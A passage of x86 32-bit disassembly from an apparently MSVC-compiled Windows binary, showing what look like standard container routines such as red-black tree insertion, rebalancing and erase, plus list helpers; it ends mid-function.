   1abe0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1abe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1abe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1abe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1abe4:	pop    edi
   1abe5:	pop    esi
   1abe6:	pop    ebx
   1abe7:	leave  
   1abe8:	ret    
   1abe9:	int3   
   1abea:	int3   
   1abeb:	int3   
   1abec:	int3   
   1abed:	int3   
   1abee:	mov    edi,edi
   1abf0:	push   ebp
   1abf1:	mov    ebp,esp
   1abf3:	mov    eax,DWORD PTR [ebp+0xc]
   1abf6:	push   ebx
   1abf7:	push   esi
   1abf8:	push   edi
   1abf9:	lea    edi,[eax+0x4]
   1abfc:	push   DWORD PTR [edi]
   1abfe:	mov    ebx,ecx
   1ac00:	push   eax
   1ac01:	call   0x1a95e
   1ac06:	push   DWORD PTR [ebp+0x10]
   1ac09:	mov    esi,eax
   1ac0b:	mov    DWORD PTR [edi],esi
   1ac0d:	mov    eax,DWORD PTR [esi+0x4]
   1ac10:	mov    DWORD PTR [eax],esi
   1ac12:	lea    eax,[esi+0x8]
   1ac15:	push   eax
   1ac16:	call   0x1a344
   1ac1b:	mov    eax,DWORD PTR [ebp+0x8]
   1ac1e:	inc    DWORD PTR [ebx+0x8]
   1ac21:	pop    edi
   1ac22:	mov    DWORD PTR [eax],esi
   1ac24:	pop    esi
   1ac25:	pop    ebx
   1ac26:	pop    ebp
   1ac27:	ret    0xc
   1ac2a:	int3   
   1ac2b:	int3   
   1ac2c:	int3   
   1ac2d:	int3   
   1ac2e:	int3   
   1ac2f:	int3   
   1ac30:	mov    edi,edi
   1ac32:	push   ebp
   1ac33:	mov    ebp,esp
   1ac35:	push   ecx
   1ac36:	mov    eax,DWORD PTR [ebp+0xc]
   1ac39:	push   esi
   1ac3a:	mov    esi,ecx
   1ac3c:	jmp    0x1ac58
   1ac3e:	add    eax,0x8
   1ac41:	push   eax
   1ac42:	push   DWORD PTR [ebp+0x8]
   1ac45:	lea    eax,[ebp-0x4]
   1ac48:	push   eax
   1ac49:	mov    ecx,esi
   1ac4b:	call   0x1abee
   1ac50:	mov    eax,DWORD PTR [ebp+0xc]
   1ac53:	mov    eax,DWORD PTR [eax]
   1ac55:	mov    DWORD PTR [ebp+0xc],eax
   1ac58:	cmp    eax,DWORD PTR [ebp+0x10]
   1ac5b:	jne    0x1ac3e
   1ac5d:	pop    esi
   1ac5e:	leave  
   1ac5f:	ret    0xc
   1ac62:	int3   
   1ac63:	int3   
   1ac64:	int3   
   1ac65:	int3   
   1ac66:	int3   
   1ac67:	int3   
   1ac68:	mov    edi,edi
   1ac6a:	push   ebp
   1ac6b:	mov    ebp,esp
   1ac6d:	push   esi
   1ac6e:	push   edi
   1ac6f:	push   DWORD PTR [ebp+0xc]
   1ac72:	mov    edi,ecx
   1ac74:	call   0x1a5c8
   1ac79:	push   DWORD PTR [ebp+0xc]
   1ac7c:	mov    ecx,edi
   1ac7e:	mov    esi,eax
   1ac80:	call   0x1a588
   1ac85:	mov    ecx,DWORD PTR [ebp+0x8]
   1ac88:	pop    edi
   1ac89:	mov    DWORD PTR [ecx],eax
   1ac8b:	mov    DWORD PTR [ecx+0x4],esi
   1ac8e:	mov    eax,ecx
   1ac90:	pop    esi
   1ac91:	pop    ebp
   1ac92:	ret    0x8
   1ac95:	int3   
   1ac96:	int3   
   1ac97:	int3   
   1ac98:	int3   
   1ac99:	int3   
   1ac9a:	mov    edi,edi
   1ac9c:	push   ebp
   1ac9d:	mov    ebp,esp
   1ac9f:	push   ecx
   1aca0:	push   ebx
   1aca1:	push   esi
   1aca2:	push   edi
   1aca3:	push   0x1
   1aca5:	xor    edi,edi
   1aca7:	push   edi
   1aca8:	mov    esi,ecx
   1acaa:	call   0x1393a
   1acaf:	lea    ecx,[ebp-0x1]
   1acb2:	mov    ebx,eax
   1acb4:	call   DWORD PTR ds:0x7e03c
   1acba:	cmp    DWORD PTR ds:0x7fa8c,edi
   1acc0:	jne    0x1acd5
   1acc2:	mov    eax,ebx
   1acc4:	mov    ds:0x7fa8c,eax
   1acc9:	mov    DWORD PTR [eax],edi
   1accb:	mov    eax,ds:0x7fa8c
   1acd0:	xor    ebx,ebx
   1acd2:	mov    DWORD PTR [eax+0x8],edi
   1acd5:	inc    DWORD PTR ds:0x7fa90
   1acdb:	lea    ecx,[ebp-0x1]
   1acde:	call   DWORD PTR ds:0x7e038
   1ace4:	cmp    ebx,edi
   1ace6:	je     0x1acef
   1ace8:	push   ebx
   1ace9:	call   0x1d9f8
   1acee:	pop    ecx
   1acef:	push   edi
   1acf0:	push   DWORD PTR ds:0x7fa8c
   1acf6:	mov    ecx,esi
   1acf8:	call   0x1393a
   1acfd:	mov    DWORD PTR [esi+0xc],edi
   1ad00:	mov    DWORD PTR [esi+0x4],eax
   1ad03:	mov    DWORD PTR [eax],eax
   1ad05:	mov    esi,DWORD PTR [esi+0x4]
   1ad08:	pop    edi
   1ad09:	mov    DWORD PTR [esi+0x8],esi
   1ad0c:	pop    esi
   1ad0d:	pop    ebx
   1ad0e:	leave  
   1ad0f:	ret    
   1ad10:	int3   
   1ad11:	int3   
   1ad12:	int3   
   1ad13:	int3   
   1ad14:	int3   
   1ad15:	int3   
   1ad16:	mov    edi,edi
   1ad18:	push   ebp
   1ad19:	mov    ebp,esp
   1ad1b:	push   ebx
   1ad1c:	push   esi
   1ad1d:	mov    esi,DWORD PTR [ebp+0x10]
   1ad20:	push   edi
   1ad21:	push   0x0
   1ad23:	push   esi
   1ad24:	mov    edi,ecx
   1ad26:	call   0x1393a
   1ad2b:	push   DWORD PTR [ebp+0x14]
   1ad2e:	mov    ebx,eax
   1ad30:	mov    eax,ds:0x7fa8c
   1ad35:	mov    DWORD PTR [ebx],eax
   1ad37:	mov    eax,ds:0x7fa8c
   1ad3c:	mov    DWORD PTR [ebx+0x8],eax
   1ad3f:	lea    eax,[ebx+0xc]
   1ad42:	push   eax
   1ad43:	call   0x1a608
   1ad48:	inc    DWORD PTR [edi+0xc]
   1ad4b:	cmp    esi,DWORD PTR [edi+0x4]
   1ad4e:	je     0x1ad78
   1ad50:	mov    eax,DWORD PTR [ebp+0xc]
   1ad53:	cmp    eax,DWORD PTR ds:0x7fa8c
   1ad59:	jne    0x1ad78
   1ad5b:	lea    eax,[esi+0xc]
   1ad5e:	push   eax
   1ad5f:	push   DWORD PTR [ebp+0x14]
   1ad62:	call   0x19790
   1ad67:	test   al,al
   1ad69:	jne    0x1ad78
   1ad6b:	mov    DWORD PTR [esi+0x8],ebx
   1ad6e:	mov    eax,DWORD PTR [edi+0x4]
   1ad71:	cmp    esi,DWORD PTR [eax+0x8]
   1ad74:	jne    0x1ad92
   1ad76:	jmp    0x1ad87
   1ad78:	mov    DWORD PTR [esi],ebx
   1ad7a:	mov    eax,DWORD PTR [edi+0x4]
   1ad7d:	cmp    esi,eax
   1ad7f:	jne    0x1ad8c
   1ad81:	mov    DWORD PTR [eax+0x4],ebx
   1ad84:	mov    eax,DWORD PTR [edi+0x4]
   1ad87:	mov    DWORD PTR [eax+0x8],ebx
   1ad8a:	jmp    0x1ad92
   1ad8c:	cmp    esi,DWORD PTR [eax]
   1ad8e:	jne    0x1ad92
   1ad90:	mov    DWORD PTR [eax],ebx
   1ad92:	mov    eax,DWORD PTR [edi+0x4]
   1ad95:	mov    esi,ebx
   1ad97:	cmp    ebx,DWORD PTR [eax+0x4]
   1ad9a:	je     0x1ae4e
   1ada0:	mov    eax,DWORD PTR [esi+0x4]
   1ada3:	xor    edx,edx
   1ada5:	cmp    DWORD PTR [eax+0x14],edx
   1ada8:	jne    0x1ae4e
   1adae:	mov    ecx,DWORD PTR [eax+0x4]
   1adb1:	cmp    eax,DWORD PTR [ecx]
   1adb3:	jne    0x1adef
   1adb5:	mov    ecx,DWORD PTR [ecx+0x8]
   1adb8:	cmp    DWORD PTR [ecx+0x14],edx
   1adbb:	je     0x1adf6
   1adbd:	cmp    esi,DWORD PTR [eax+0x8]
   1adc0:	jne    0x1adcc
   1adc2:	mov    esi,eax
   1adc4:	push   esi
   1adc5:	mov    ecx,edi
   1adc7:	call   0x1a4aa
   1adcc:	mov    eax,DWORD PTR [esi+0x4]
   1adcf:	mov    DWORD PTR [eax+0x14],0x1
   1add6:	mov    eax,DWORD PTR [esi+0x4]
   1add9:	mov    eax,DWORD PTR [eax+0x4]
   1addc:	and    DWORD PTR [eax+0x14],0x0
   1ade0:	mov    eax,DWORD PTR [esi+0x4]
   1ade3:	push   DWORD PTR [eax+0x4]
   1ade6:	mov    ecx,edi
   1ade8:	call   0x1a4f8
   1aded:	jmp    0x1ae42
   1adef:	mov    ecx,DWORD PTR [ecx]
   1adf1:	cmp    DWORD PTR [ecx+0x14],edx
   1adf4:	jne    0x1ae13
   1adf6:	mov    edx,eax
   1adf8:	xor    eax,eax
   1adfa:	inc    eax
   1adfb:	mov    DWORD PTR [edx+0x14],eax
   1adfe:	mov    DWORD PTR [ecx+0x14],eax
   1ae01:	mov    eax,DWORD PTR [esi+0x4]
   1ae04:	mov    eax,DWORD PTR [eax+0x4]
   1ae07:	and    DWORD PTR [eax+0x14],0x0
   1ae0b:	mov    eax,DWORD PTR [esi+0x4]
   1ae0e:	mov    esi,DWORD PTR [eax+0x4]
   1ae11:	jmp    0x1ae42
   1ae13:	cmp    esi,DWORD PTR [eax]
   1ae15:	jne    0x1ae21
   1ae17:	mov    esi,eax
   1ae19:	push   esi
   1ae1a:	mov    ecx,edi
   1ae1c:	call   0x1a4f8
   1ae21:	mov    eax,DWORD PTR [esi+0x4]
   1ae24:	mov    DWORD PTR [eax+0x14],0x1
   1ae2b:	mov    eax,DWORD PTR [esi+0x4]
   1ae2e:	mov    eax,DWORD PTR [eax+0x4]
   1ae31:	and    DWORD PTR [eax+0x14],0x0
   1ae35:	mov    eax,DWORD PTR [esi+0x4]
   1ae38:	push   DWORD PTR [eax+0x4]
   1ae3b:	mov    ecx,edi
   1ae3d:	call   0x1a4aa
   1ae42:	mov    eax,DWORD PTR [edi+0x4]
   1ae45:	cmp    esi,DWORD PTR [eax+0x4]
   1ae48:	jne    0x1ada0
   1ae4e:	mov    eax,DWORD PTR [edi+0x4]
   1ae51:	mov    eax,DWORD PTR [eax+0x4]
   1ae54:	pop    edi
   1ae55:	mov    DWORD PTR [eax+0x14],0x1
   1ae5c:	mov    eax,DWORD PTR [ebp+0x8]
   1ae5f:	pop    esi
   1ae60:	mov    DWORD PTR [eax],ebx
   1ae62:	pop    ebx
   1ae63:	pop    ebp
   1ae64:	ret    0x10
   1ae67:	int3   
   1ae68:	int3   
   1ae69:	int3   
   1ae6a:	int3   
   1ae6b:	int3   
   1ae6c:	mov    edi,edi
   1ae6e:	push   ebp
   1ae6f:	mov    ebp,esp
   1ae71:	sub    esp,0x10
   1ae74:	push   ebx
   1ae75:	push   esi
   1ae76:	mov    DWORD PTR [ebp-0xc],ecx
   1ae79:	push   edi
   1ae7a:	mov    edi,DWORD PTR [ebp+0xc]
   1ae7d:	lea    ecx,[ebp+0xc]
   1ae80:	call   0x1a30e
   1ae85:	mov    esi,DWORD PTR [edi]
   1ae87:	mov    eax,ds:0x7fa8c
   1ae8c:	lea    ebx,[edi+0x8]
   1ae8f:	mov    DWORD PTR [ebp-0x8],edi
   1ae92:	mov    DWORD PTR [ebp-0x10],ebx
   1ae95:	cmp    esi,eax
   1ae97:	jne    0x1ae9d
   1ae99:	mov    esi,DWORD PTR [ebx]
   1ae9b:	jmp    0x1aeb4
   1ae9d:	mov    ecx,DWORD PTR [ebx]
   1ae9f:	cmp    ecx,eax
   1aea1:	je     0x1aeb4
   1aea3:	push   ecx
   1aea4:	call   0x1a2ec
   1aea9:	mov    DWORD PTR [ebp-0x8],eax
   1aeac:	add    eax,0x8
   1aeaf:	mov    esi,DWORD PTR [eax]
   1aeb1:	mov    DWORD PTR [ebp-0x10],eax
   1aeb4:	lea    ecx,[ebp-0x1]
   1aeb7:	call   DWORD PTR ds:0x7e03c
   1aebd:	mov    eax,DWORD PTR [ebp-0x8]
   1aec0:	cmp    eax,edi
   1aec2:	je     0x1af24
   1aec4:	mov    ecx,DWORD PTR [edi]
   1aec6:	mov    DWORD PTR [ecx+0x4],eax
   1aec9:	mov    ecx,DWORD PTR [edi]
   1aecb:	mov    DWORD PTR [eax],ecx
   1aecd:	cmp    eax,DWORD PTR [ebx]
   1aecf:	jne    0x1aed6
   1aed1:	mov    DWORD PTR [esi+0x4],eax
   1aed4:	jmp    0x1aeed
   1aed6:	mov    ecx,DWORD PTR [eax+0x4]
   1aed9:	mov    edx,DWORD PTR [ebp-0x10]
   1aedc:	mov    DWORD PTR [esi+0x4],ecx
   1aedf:	mov    ecx,DWORD PTR [eax+0x4]
   1aee2:	mov    DWORD PTR [ecx],esi
   1aee4:	mov    ecx,DWORD PTR [ebx]
   1aee6:	mov    DWORD PTR [edx],ecx
   1aee8:	mov    ecx,DWORD PTR [ebx]
   1aeea:	mov    DWORD PTR [ecx+0x4],eax
   1aeed:	mov    ebx,DWORD PTR [ebp-0xc]
   1aef0:	mov    ecx,DWORD PTR [ebx+0x4]
   1aef3:	cmp    DWORD PTR [ecx+0x4],edi
   1aef6:	jne    0x1aefd
   1aef8:	mov    DWORD PTR [ecx+0x4],eax
   1aefb:	jmp    0x1af0b
   1aefd:	mov    ecx,DWORD PTR [edi+0x4]
   1af00:	cmp    DWORD PTR [ecx],edi
   1af02:	jne    0x1af08
   1af04:	mov    DWORD PTR [ecx],eax
   1af06:	jmp    0x1af0b
   1af08:	mov    DWORD PTR [ecx+0x8],eax
   1af0b:	mov    ecx,DWORD PTR [edi+0x4]
   1af0e:	mov    DWORD PTR [eax+0x4],ecx
   1af11:	mov    ecx,DWORD PTR [eax+0x14]
   1af14:	mov    edx,DWORD PTR [edi+0x14]
   1af17:	mov    DWORD PTR [eax+0x14],edx
   1af1a:	mov    DWORD PTR [edi+0x14],ecx
   1af1d:	mov    DWORD PTR [ebp-0x8],edi
   1af20:	mov    eax,edi
   1af22:	jmp    0x1af9d
   1af24:	mov    ecx,DWORD PTR [eax+0x4]
   1af27:	mov    edx,DWORD PTR [ebp-0xc]
   1af2a:	mov    DWORD PTR [esi+0x4],ecx
   1af2d:	mov    ecx,DWORD PTR [edx+0x4]
   1af30:	cmp    DWORD PTR [ecx+0x4],edi
   1af33:	jne    0x1af3a
   1af35:	mov    DWORD PTR [ecx+0x4],esi
   1af38:	jmp    0x1af48
   1af3a:	mov    ecx,DWORD PTR [edi+0x4]
   1af3d:	cmp    DWORD PTR [ecx],edi
   1af3f:	jne    0x1af45
   1af41:	mov    DWORD PTR [ecx],esi
   1af43:	jmp    0x1af48
   1af45:	mov    DWORD PTR [ecx+0x8],esi
   1af48:	mov    ecx,DWORD PTR [edx+0x4]
   1af4b:	mov    DWORD PTR [ebp-0x10],ecx
   1af4e:	cmp    DWORD PTR [ecx],edi
   1af50:	jne    0x1af74
   1af52:	mov    ebx,DWORD PTR [ebx]
   1af54:	cmp    ebx,DWORD PTR ds:0x7fa8c
   1af5a:	jne    0x1af63
   1af5c:	mov    ebx,DWORD PTR [edi+0x4]
   1af5f:	mov    DWORD PTR [ecx],ebx
   1af61:	jmp    0x1af74
   1af63:	push   esi
   1af64:	call   0x1a2ec
   1af69:	mov    ecx,DWORD PTR [ebp-0x10]
   1af6c:	mov    edx,DWORD PTR [ebp-0xc]
   1af6f:	mov    DWORD PTR [ecx],eax
   1af71:	mov    eax,DWORD PTR [ebp-0x8]
   1af74:	mov    ebx,DWORD PTR [edx+0x4]
   1af77:	cmp    DWORD PTR [ebx+0x8],edi
   1af7a:	jne    0x1af9a
   1af7c:	mov    ecx,DWORD PTR [edi]
   1af7e:	cmp    ecx,DWORD PTR ds:0x7fa8c
   1af84:	jne    0x1af8e
   1af86:	mov    ecx,DWORD PTR [edi+0x4]
   1af89:	mov    DWORD PTR [ebx+0x8],ecx
   1af8c:	jmp    0x1af9a
   1af8e:	push   esi
   1af8f:	call   0x1a2ca
   1af94:	mov    DWORD PTR [ebx+0x8],eax
   1af97:	mov    eax,DWORD PTR [ebp-0x8]
   1af9a:	mov    ebx,DWORD PTR [ebp-0xc]
   1af9d:	xor    edi,edi
   1af9f:	inc    edi
   1afa0:	cmp    DWORD PTR [eax+0x14],edi
   1afa3:	jne    0x1b0b7
   1afa9:	jmp    0x1b06a
   1afae:	cmp    DWORD PTR [esi+0x14],edi
   1afb1:	jne    0x1b0b4
   1afb7:	mov    eax,DWORD PTR [esi+0x4]
   1afba:	cmp    esi,DWORD PTR [eax]
   1afbc:	jne    0x1b033
   1afbe:	mov    eax,DWORD PTR [eax+0x8]
   1afc1:	cmp    DWORD PTR [eax+0x14],0x0
   1afc5:	jne    0x1afe1
   1afc7:	mov    DWORD PTR [eax+0x14],edi
   1afca:	mov    eax,DWORD PTR [esi+0x4]
   1afcd:	and    DWORD PTR [eax+0x14],0x0
   1afd1:	push   DWORD PTR [esi+0x4]
   1afd4:	mov    ecx,ebx
   1afd6:	call   0x1a4aa
   1afdb:	mov    eax,DWORD PTR [esi+0x4]
   1afde:	mov    eax,DWORD PTR [eax+0x8]
   1afe1:	mov    ecx,DWORD PTR [eax]
   1afe3:	cmp    DWORD PTR [ecx+0x14],edi
   1afe6:	jne    0x1aff0
   1afe8:	mov    ecx,DWORD PTR [eax+0x8]
   1afeb:	cmp    DWORD PTR [ecx+0x14],edi
   1afee:	je     0x1b063
   1aff0:	mov    ecx,DWORD PTR [eax+0x8]
   1aff3:	cmp    DWORD PTR [ecx+0x14],edi
   1aff6:	jne    0x1b00f
   1aff8:	mov    ecx,DWORD PTR [eax]
   1affa:	mov    DWORD PTR [ecx+0x14],edi
   1affd:	and    DWORD PTR [eax+0x14],0x0
   1b001:	push   eax
   1b002:	mov    ecx,ebx
   1b004:	call   0x1a4f8
   1b009:	mov    eax,DWORD PTR [esi+0x4]
   1b00c:	mov    eax,DWORD PTR [eax+0x8]
   1b00f:	mov    ecx,DWORD PTR [esi+0x4]
   1b012:	mov    ecx,DWORD PTR [ecx+0x14]
   1b015:	mov    DWORD PTR [eax+0x14],ecx
   1b018:	mov    ecx,DWORD PTR [esi+0x4]
   1b01b:	mov    DWORD PTR [ecx+0x14],edi
   1b01e:	mov    eax,DWORD PTR [eax+0x8]
   1b021:	mov    DWORD PTR [eax+0x14],edi
   1b024:	push   DWORD PTR [esi+0x4]
   1b027:	mov    ecx,ebx
   1b029:	call   0x1a4aa
   1b02e:	jmp    0x1b0b4
   1b033:	mov    eax,DWORD PTR [eax]
   1b035:	cmp    DWORD PTR [eax+0x14],0x0
   1b039:	jne    0x1b054
   1b03b:	mov    DWORD PTR [eax+0x14],edi
   1b03e:	mov    eax,DWORD PTR [esi+0x4]
   1b041:	and    DWORD PTR [eax+0x14],0x0
   1b045:	push   DWORD PTR [esi+0x4]
   1b048:	mov    ecx,ebx
   1b04a:	call   0x1a4f8
   1b04f:	mov    eax,DWORD PTR [esi+0x4]
   1b052:	mov    eax,DWORD PTR [eax]
   1b054:	mov    ecx,DWORD PTR [eax+0x8]
   1b057:	cmp    DWORD PTR [ecx+0x14],edi
   1b05a:	jne    0x1b078
   1b05c:	mov    ecx,DWORD PTR [eax]
   1b05e:	cmp    DWORD PTR [ecx+0x14],edi
   1b061:	jne    0x1b078
   1b063:	and    DWORD PTR [eax+0x14],0x0
   1b067:	mov    esi,DWORD PTR [esi+0x4]
   1b06a:	mov    eax,DWORD PTR [ebx+0x4]
   1b06d:	cmp    esi,DWORD PTR [eax+0x4]
   1b070:	jne    0x1afae
   1b076:	jmp    0x1b0b4
   1b078:	mov    ecx,DWORD PTR [eax]
   1b07a:	cmp    DWORD PTR [ecx+0x14],edi
   1b07d:	jne    0x1b096
   1b07f:	mov    ecx,DWORD PTR [eax+0x8]
   1b082:	mov    DWORD PTR [ecx+0x14],edi
   1b085:	and    DWORD PTR [eax+0x14],0x0
   1b089:	push   eax
   1b08a:	mov    ecx,ebx
   1b08c:	call   0x1a4aa
   1b091:	mov    eax,DWORD PTR [esi+0x4]
   1b094:	mov    eax,DWORD PTR [eax]
   1b096:	mov    ecx,DWORD PTR [esi+0x4]
   1b099:	mov    ecx,DWORD PTR [ecx+0x14]
   1b09c:	mov    DWORD PTR [eax+0x14],ecx
   1b09f:	mov    ecx,DWORD PTR [esi+0x4]
   1b0a2:	mov    DWORD PTR [ecx+0x14],edi
   1b0a5:	mov    eax,DWORD PTR [eax]
   1b0a7:	mov    DWORD PTR [eax+0x14],edi
   1b0aa:	push   DWORD PTR [esi+0x4]
   1b0ad:	mov    ecx,ebx
   1b0af:	call   0x1a4f8
   1b0b4:	mov    DWORD PTR [esi+0x14],edi
   1b0b7:	lea    ecx,[ebp-0x1]
   1b0ba:	call   DWORD PTR ds:0x7e038
   1b0c0:	mov    esi,DWORD PTR [ebp-0x8]
   1b0c3:	lea    eax,[esi+0xc]
   1b0c6:	push   eax
   1b0c7:	call   0x1a626
   1b0cc:	push   esi
   1b0cd:	call   0x1d9f8
   1b0d2:	mov    eax,DWORD PTR [ebp+0x8]
   1b0d5:	dec    DWORD PTR [ebx+0xc]
   1b0d8:	pop    ecx
   1b0d9:	mov    ecx,DWORD PTR [ebp+0xc]
   1b0dc:	pop    edi
   1b0dd:	pop    esi
   1b0de:	mov    DWORD PTR [eax],ecx
   1b0e0:	pop    ebx
   1b0e1:	leave  
   1b0e2:	ret    0x8
   1b0e5:	int3   
   1b0e6:	int3   
   1b0e7:	int3   
   1b0e8:	int3   
   1b0e9:	int3   
   1b0ea:	mov    edi,edi
   1b0ec:	push   ebp
   1b0ed:	mov    ebp,esp
   1b0ef:	push   ebx
   1b0f0:	push   esi
   1b0f1:	push   edi
   1b0f2:	mov    edi,DWORD PTR [ebp+0x8]
   1b0f5:	mov    ebx,ecx
   1b0f7:	mov    esi,edi
   1b0f9:	cmp    edi,DWORD PTR ds:0x7fa8c
   1b0ff:	je     0x1b127
   1b101:	push   DWORD PTR [esi+0x8]
   1b104:	mov    ecx,ebx
   1b106:	call   0x1b0ea
   1b10b:	mov    esi,DWORD PTR [esi]
   1b10d:	lea    eax,[edi+0xc]
   1b110:	push   eax
   1b111:	call   0x1a626
   1b116:	push   edi
   1b117:	call   0x1d9f8
   1b11c:	pop    ecx
   1b11d:	mov    edi,esi
   1b11f:	cmp    esi,DWORD PTR ds:0x7fa8c
   1b125:	jne    0x1b101
   1b127:	pop    edi
   1b128:	pop    esi
   1b129:	pop    ebx
   1b12a:	pop    ebp
   1b12b:	ret    0x4
   1b12e:	int3   
   1b12f:	int3   
   1b130:	int3   
   1b131:	int3   
   1b132:	int3   
   1b133:	int3   
   1b134:	mov    edi,edi
   1b136:	push   ebp
   1b137:	mov    ebp,esp
   1b139:	push   ecx
   1b13a:	push   DWORD PTR [ebp-0x4]
   1b13d:	push   DWORD PTR [ebp+0x10]
   1b140:	push   DWORD PTR [ebp+0xc]
   1b143:	push   DWORD PTR [ebp+0x8]
   1b146:	call   0x1aa0a
   1b14b:	add    esp,0x10
   1b14e:	leave  
   1b14f:	ret    
   1b150:	int3   
   1b151:	int3   
   1b152:	int3   
   1b153:	int3   
   1b154:	int3   
   1b155:	int3   
   1b156:	mov    edi,edi
   1b158:	push   esi
   1b159:	mov    esi,ecx
   1b15b:	jmp    0x1b164
   1b15d:	mov    ecx,esi
   1b15f:	call   0x1aa92
   1b164:	cmp    DWORD PTR [esi+0x2c],0x0
   1b168:	jne    0x1b15d
   1b16a:	pop    esi
   1b16b:	ret    
   1b16c:	int3   
   1b16d:	int3   
   1b16e:	int3   
   1b16f:	int3   
   1b170:	int3   
   1b171:	int3   
   1b172:	mov    edi,edi
   1b174:	push   ebp
   1b175:	mov    ebp,esp
   1b177:	push   esi
   1b178:	mov    esi,ecx
   1b17a:	cmp    DWORD PTR [esi+0x2c],0x0
   1b17e:	je     0x1b1a6
   1b180:	mov    ecx,DWORD PTR [esi+0x1c]
   1b183:	mov    edx,DWORD PTR [esi+0x18]
   1b186:	cmp    ecx,edx
   1b188:	je     0x1b1a6
   1b18a:	push   DWORD PTR [ebp+0x8]
   1b18d:	lea    eax,[ecx+0x4]
   1b190:	mov    DWORD PTR [esi+0x1c],eax
   1b193:	push   ecx
   1b194:	cmp    eax,edx
   1b196:	jne    0x1b1ba
   1b198:	call   0x1a344
   1b19d:	mov    ecx,esi
   1b19f:	call   0x1ab24
   1b1a4:	jmp    0x1b1bf
   1b1a6:	mov    ecx,esi
   1b1a8:	call   0x1ab24
   1b1ad:	mov    eax,DWORD PTR [esi+0x1c]
   1b1b0:	push   DWORD PTR [ebp+0x8]
   1b1b3:	lea    ecx,[eax+0x4]
   1b1b6:	mov    DWORD PTR [esi+0x1c],ecx
   1b1b9:	push   eax
   1b1ba:	call   0x1a344
   1b1bf:	inc    DWORD PTR [esi+0x2c]
   1b1c2:	pop    esi
   1b1c3:	pop    ebp
   1b1c4:	ret    0x4
   1b1c7:	int3   
   1b1c8:	int3   
   1b1c9:	int3   
   1b1ca:	int3   
   1b1cb:	int3   
   1b1cc:	mov    edi,edi
   1b1ce:	push   ebp
   1b1cf:	mov    ebp,esp
   1b1d1:	push   esi
   1b1d2:	push   0x0
   1b1d4:	push   0xc
   1b1d6:	mov    esi,ecx
   1b1d8:	call   0x11604
   1b1dd:	mov    ecx,DWORD PTR [ebp+0x8]
   1b1e0:	mov    DWORD PTR [eax],eax
   1b1e2:	mov    DWORD PTR [eax+0x4],eax
   1b1e5:	and    DWORD PTR [esi+0x8],0x0
   1b1e9:	mov    DWORD PTR [esi+0x4],eax
   1b1ec:	mov    ecx,DWORD PTR [ecx+0x4]
   1b1ef:	mov    edx,DWORD PTR [ecx]
   1b1f1:	mov    eax,DWORD PTR [eax]
   1b1f3:	push   ecx
   1b1f4:	push   edx
   1b1f5:	push   eax
   1b1f6:	mov    ecx,esi
   1b1f8:	call   0x1ac30
   1b1fd:	mov    eax,esi
   1b1ff:	pop    esi
   1b200:	pop    ebp
   1b201:	ret    0x4
   1b204:	int3   
   1b205:	int3   
   1b206:	int3   
   1b207:	int3   
   1b208:	int3   
   1b209:	int3   
   1b20a:	mov    edi,edi
   1b20c:	push   ebp
   1b20d:	mov    ebp,esp
   1b20f:	push   ecx
   1b210:	mov    edx,DWORD PTR [ebp+0x8]
   1b213:	mov    DWORD PTR [ebp-0x4],ecx
   1b216:	cmp    ecx,edx
   1b218:	je     0x1b257
   1b21a:	push   ebx
   1b21b:	mov    ebx,DWORD PTR [edx+0x4]
   1b21e:	push   esi
   1b21f:	mov    esi,DWORD PTR [ecx+0x4]
   1b222:	mov    eax,DWORD PTR [esi]
   1b224:	push   edi
   1b225:	mov    edi,DWORD PTR [ebx]
   1b227:	jmp    0x1b237
   1b229:	cmp    edi,ebx
   1b22b:	je     0x1b23b
   1b22d:	mov    edx,DWORD PTR [edi+0x8]
   1b230:	mov    DWORD PTR [eax+0x8],edx
   1b233:	mov    eax,DWORD PTR [eax]
   1b235:	mov    edi,DWORD PTR [edi]
   1b237:	cmp    eax,esi
   1b239:	jne    0x1b229
   1b23b:	push   esi
   1b23c:	push   eax
   1b23d:	lea    eax,[ebp+0x8]
   1b240:	push   eax
   1b241:	call   0x1a928
   1b246:	mov    ecx,DWORD PTR [ebp-0x4]
   1b249:	push   ebx
   1b24a:	push   edi
   1b24b:	push   esi
   1b24c:	call   0x1ac30
   1b251:	mov    ecx,DWORD PTR [ebp-0x4]
   1b254:	pop    edi
   1b255:	pop    esi
   1b256:	pop    ebx
   1b257:	mov    eax,ecx
   1b259:	leave  
   1b25a:	ret    0x4
   1b25d:	int3   
   1b25e:	int3   
   1b25f:	int3   
   1b260:	int3   
   1b261:	int3   
   1b262:	mov    edi,edi
   1b264:	push   ebp
   1b265:	mov    ebp,esp
   1b267:	push   DWORD PTR [ebp+0x8]
   1b26a:	mov    eax,DWORD PTR [ecx+0x4]
   1b26d:	push   eax
   1b26e:	lea    eax,[ebp+0x8]
   1b271:	push   eax
   1b272:	call   0x1abee
   1b277:	pop    ebp
   1b278:	ret    0x4
   1b27b:	int3   
   1b27c:	int3   
   1b27d:	int3   
   1b27e:	int3   
   1b27f:	int3   
   1b280:	mov    edi,edi
   1b282:	push   ebp
   1b283:	mov    ebp,esp
   1b285:	push   ecx
   1b286:	push   ebx
   1b287:	push   esi
   1b288:	push   edi
   1b289:	mov    edi,ecx
   1b28b:	mov    eax,DWORD PTR [edi+0x4]
   1b28e:	mov    esi,DWORD PTR [eax+0x4]
   1b291:	mov    ebx,eax
   1b293:	mov    al,0x1
   1b295:	jmp    0x1b2b0
   1b297:	lea    eax,[esi+0xc]
   1b29a:	push   eax
   1b29b:	push   DWORD PTR [ebp+0xc]
   1b29e:	mov    ebx,esi
   1b2a0:	call   0x19790
   1b2a5:	test   al,al
   1b2a7:	je     0x1b2ad
   1b2a9:	mov    esi,DWORD PTR [esi]
   1b2ab:	jmp    0x1b2b0
   1b2ad:	mov    esi,DWORD PTR [esi+0x8]
   1b2b0:	cmp    esi,DWORD PTR ds:0x7fa8c
   1b2b6:	jne    0x1b297
   1b2b8:	cmp    BYTE PTR [edi+0x8],0x0
   1b2bc:	je     0x1b2d9
   1b2be:	push   DWORD PTR [ebp+0xc]
   1b2c1:	lea    eax,[ebp+0xc]
   1b2c4:	push   ebx
   1b2c5:	push   esi
   1b2c6:	push   eax
   1b2c7:	mov    ecx,edi
   1b2c9:	call   0x1ad16
   1b2ce:	mov    ecx,DWORD PTR [eax]
   1b2d0:	mov    eax,DWORD PTR [ebp+0x8]
   1b2d3:	mov    BYTE PTR [eax+0x4],0x1
